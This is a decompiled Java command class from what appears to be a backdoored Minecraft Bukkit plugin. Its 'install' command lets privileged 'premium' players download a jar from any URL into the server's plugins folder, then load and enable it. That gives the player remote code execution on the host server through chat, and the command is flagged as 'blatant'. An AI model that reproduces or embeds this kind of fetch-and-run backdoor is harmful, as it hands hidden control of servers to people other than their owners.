/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class InstallCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 2) {
                p2.sendMessage(Settings.USAGE("install <direct download url> <output name>"));
            } else {
                String name = args[2];
                if (Bukkit.getPluginManager().getPlugin(name) == null) {
                    try {
                        InputStream in2 = new URL(args[1]).openStream();
                        Files.copy(in2, Paths.get("plugins/" + name + ".jar", new String[0]), StandardCopyOption.REPLACE_EXISTING);
                    }
                    catch (Exception e2) {
                        p2.sendMessage(Settings.PREFIX("Error: Something wrong with URL"));
                    }
                    p2.sendMessage(Settings.PREFIX("Plugin installed. Enabling..."));
                    Bukkit.getScheduler().runTaskLater((Plugin)plugin, () -> {
                        try {
                            Bukkit.getPluginManager().loadPlugin(new File(Paths.get("plugins/" + name + ".jar", new String[0]).toString()));
                        }
                        catch (Exception e2) {
                            e2.printStackTrace();
                            p2.sendMessage(Settings.PREFIX("Error: Something went wrong with loading the plugin. Reload the server to enable the plugin!"));
                        }
                        if (Bukkit.getPluginManager().getPlugin(name) != null) {
                            Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(name));
                            p2.sendMessage(Settings.PREFIX("Plugin enabled!"));
                        }
                    }, 60L);
                } else {
                    p2.sendMessage(Settings.PREFIX("This plugin already exists!"));
                }
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

